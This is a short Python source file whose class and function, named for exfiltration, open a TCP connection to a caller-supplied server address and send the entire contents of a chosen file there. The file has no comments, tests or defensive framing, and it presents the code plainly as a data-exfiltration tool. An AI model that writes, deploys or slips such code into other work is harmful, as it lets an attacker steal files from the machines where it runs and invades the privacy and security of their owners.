import socket

class Exfiltrate:
    def __init__(self, file_path, server_ip, server_port):
        self.file_path = file_path
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((server_ip, server_port))

    def send_file(self):
        with open(self.file_path, "rb") as file:
            self.connection.sendall(file.read())

def exfiltrate_data(file_path, server_ip, server_port):
    exfiltrate = Exfiltrate(file_path, server_ip, server_port)
    exfiltrate.send_file()
